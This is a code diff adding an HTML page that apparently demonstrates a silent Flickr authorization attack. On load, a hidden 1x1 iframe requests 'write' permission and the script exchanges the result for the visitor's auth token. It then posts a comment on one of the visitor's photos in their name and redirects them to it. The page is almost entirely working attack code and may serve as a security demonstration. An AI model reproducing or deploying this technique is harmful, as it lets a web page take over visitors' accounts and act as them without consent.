@@ -1,0 +1,97 @@
+<html>
+    <head>
+        <title>Hello world</title>
+        <script src="md5.js"></script>
+        <script type="text/javascript">
+
+/* API Keys */
+var api_key = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
+var api_secret = "XXXXXXXXXXXXXXXX";
+
+
+var frob = null;
+var token = null;
+var nsid = null;
+
+
+function log (s) { }
+if (console && console.log) { log = console.log; }
+
+function flickr_url (args, type) {
+    if (!type) { type = 'rest'; }
+    var url = 'http://api.flickr.com/services/'+type+'/?'
+    var signature = api_secret;
+    var keys = new Array ();
+    for (var k in args) { keys.push (k); }
+    keys.sort ();
+    for (var i=0; i<keys.length; i++) {
+        var k = keys[i];
+        var v = args[k];
+        signature = signature + k + v;
+        url = url + (i>0?'&':'') + escape(k) + '=' + escape(v);
+    }
+    signature = hex_md5 (signature);
+    url = url + '&api_sig='+signature;
+    return url;
+}
+
+function flickr_call (args) {
+    args.api_key = api_key;
+    args.format = 'json';
+    if (token) { args.auth_token = token; }
+    var script = document.createElement ('script');
+    script.setAttribute ('type', 'text/javascript');
+    log ('call: '+args.toSource());
+    script.setAttribute ('src', flickr_url (args));
+    document.body.appendChild (script);
+}
+
+var username = null;
+var photo_id = null;
+
+function jsonFlickrApi (o) {
+    log ('response: '+o.toSource());
+    if (o.frob) {
+        /* flickr.auth.getFrob response */
+        frob = o.frob._content;
+        var iframe = document.createElement ('iframe');
+        iframe.setAttribute ('width', '1');
+        iframe.setAttribute ('height', '1');
+        iframe.setAttribute ('src', flickr_url ({api_key: api_key, 
+            perms: 'write', frob: frob}, 'auth'))
+        iframe.setAttribute ('onload', 'authed()');
+        document.body.appendChild (iframe);
+    } else if (o.auth) {
+        token = o.auth.token._content;
+        nsid = o.auth.user.nsid;
+        user_id = o.auth.user.username;
+        var p = document.createElement ('p');
+        p.appendChild (document.createTextNode ('hello '+o.auth.user.fullname));
+        document.body.appendChild (p);
+        flickr_call ({method: 'flickr.people.getPublicPhotos', user_id: nsid,
+            per_page: '1'});
+    } else if (o.photos) {
+        photo_id = o.photos.photo[0].id;
+        flickr_call ({method: 'flickr.photos.comments.addComment', 
+            photo_id: photo_id,
+            comment_text: 'Houston, we have a problem...'});
+    } else if (o.comment) {
+        window.location.href = 'http://www.flickr.com/photos/'+user_id+'/'+photo_id+'/';
+    }
+}
+
+function authed () {
+    // the page loaded in the iframe
+    // time to get the token from the frob
+    flickr_call ({method: 'flickr.auth.getToken', frob: frob});
+}
+
+        </script>
+    </head>
+    <body>
+        <p>Trying to access your account...</p>
+        <script type="text/javascript">
+            flickr_call({method:'flickr.auth.getFrob'});
+        </script>
+    </body>
+</html>
